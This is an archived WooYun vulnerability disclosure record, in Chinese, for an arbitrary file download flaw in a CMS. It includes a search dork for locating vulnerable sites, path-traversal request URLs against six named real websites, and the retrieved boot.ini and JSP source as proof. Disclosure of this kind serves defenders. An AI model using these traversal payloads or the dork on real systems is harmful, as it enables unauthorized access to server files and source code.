{"id": 30870, "wybug_id": "wooyun-2015-0115521", "wybug_title": "某建站系统任意文件下载", "wybug_corp": "cnvd", "wybug_author": "Hero", "wybug_date": "2015-05-22 14:58", "wybug_open_date": "2015-08-24 13:40", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向公众公开  简要描述： \"你为什么有我的源码？\"\"怪我咯？\" 详细说明：   WooYun: 某建站系统通用sql注入#2 还是这套系统存在任意文件下载涉及中国科技教育网 与某些外贸网站关键字: inurl:contentmanager.do?method=view漏洞页面:webedit/uploadfile.do?action=open&filepath=实例:http://www.cnstedu.cn/webedit/uploadfile.do?action=open&filepath=../../../../cms/cmsapp/search.jsphttp://kxsz.gdec.net/webedit/uploadfile.do?action=open&filepath=../../../../cms/cmsapp/search.jsphttp://www.cimuset.org/webedit/uploadfile.do?action=open&filepath=../../../../cms/cmsapp/search.jsphttp://www.fdstmc.org.cn/webedit/uploadfile.do?action=open&filepath=../../../../cms/cmsapp/search.jsphttp://www.chinaworldmall.cn/webedit/uploadfile.do?action=open&filepath=../../../../cms/cmsapp/search.jsphttp://www.sqkpym.org.cn/webedit/uploadfile.do?action=open&filepath=../../../../cms/cmsapp/search.jspwww.cnstedu.cn\n\n\n\n\n\n\n\n...   漏洞证明：  boot.ini\n[boot loader]timeout=30default=multi(0)disk(0)rdisk(1)partition(2)\\WINDOWS[operating systems]multi(0)disk(0)rdisk(1)partition(2)\\WINDOWS=\"Windows Server 2003, Enterprise\" /noexecute=optout /fastdetect\ncms/cmsapp/search.jsp\n<%@ page import=\"com.jalor.cms.column.CMSColumn,                 com.jalor.util.treemodel.FolderPath,                 com.jalor.util.Function,                 com.jalor.cms.actionform.ContentForm,                 com.jalor.cms.actionform.ContentAttachmentForm,                 com.jalor.cms.content.ContentAttachment,                 java.util.Collection,                 java.util.Iterator,                 java.util.Properties,                 com.jalor.cms.actionform.ColumnForm\"%><%@ page contentType=\"text/html;charset=GBK\" language=\"java\" %><%@ taglib uri = \"/WEB-INF/jalorportal.tld\" prefix = \"portal\"%><%@ taglib uri = \"/WEB-INF/jalorcms.tld\" prefix = \"cms\"%><%@ taglib uri=\"/WEB-INF/struts-html.tld\" prefix=\"html\" %><%@ taglib uri=\"/WEB-INF/struts-bean.tld\" prefix=\"bean\" %><%@ taglib uri=\"/WEB-INF/struts-logic.tld\" prefix=\"logic\" %><%@include file=\"/include/currentuserinfo.jsp\"%><%@include file=\"/include/pageexpires.jsp\"%><%@include file=\"/include/filepath.jsp\"%><%    ColumnForm column=(ColumnForm)request.getAttribute(\"CMSColumnForm\");    String url=\"\";%><portal:moduleconfig>    <logic:iterate id=\"pathinfo\" name=\"columnpath\" scope=\"request\">        <%            FolderPath folderPath=(FolderPath)pageContext.getAttribute(\"pathinfo\");            String name=folderPath.getFoldername();            url=\"/cms/columnmanager.do?method=list&id=\"+folderPath.getFolderid();        %>        <portal:navigation name=\"<%=name%>\" url=\"<%=url%>\"/>    </logic:iterate>    <%        String columnurl=\"/cms/columnmanager.do?method=list&id=\"+column.getId();    %>    <portal:navigation name=\"<%=column.getName()%>\" url=\"<%=columnurl%>\"/>    <portal:pagetab name=\"搜索\" url=\"\"/>    <portal:toolbutton name=\"返回\" url=\"<%=columnurl%>\" image=\"\"/></portal:moduleconfig><portal:standardstyle insertTemplate=\"standardheader.vm\"/><script language=\"javascript\"></script><form action=\"/cms/contentattachment\" method=\"post\">    <input type=\"hidden\" name=\"method\" value=\"search\">    <input type=\"hidden\" name=\"columnid\" value=\"<%=column.getId()%>\">    <table width=\"90%\" bordercolorlight=\"#000000\" bordercolordark=\"#ffffff\"  class=\"labeltable_middle_table\">        <tr>            <td class=\"labeltable_middle_td\" align=\"center\">标题</td>            <td class=\"labeltable_middle_td\" align=\"center\">作者</td>        </tr>        <%        Collection lstResult=(Collection)request.getAttribute(\"resultset\");            for(Iterator it=lstResult.iterator();it.hasNext();)            {                Properties prop=(Properties)it.next();                %>                <tr>                    <td><a href=\"/cms/contentmanager.do?method=edit&pageid=edit&columnid=<%=column.getId()%>&templateid=<%=column.getTemplateid()%>&id=<%=prop.getProperty(\"contentid\")%>\"><%=prop.getProperty(\"title\",\"\")%></a></td>                    <td><%=prop.getProperty(\"author\",\"\")%></td>                </tr>                <%            }        %>    </table></form><portal:standardstyle insertTemplate=\"standardfooter.vm\" />\n   修复方案：  目录限制权限？   版权声明：转载请注明来源 Hero@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-05-26 13:38 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}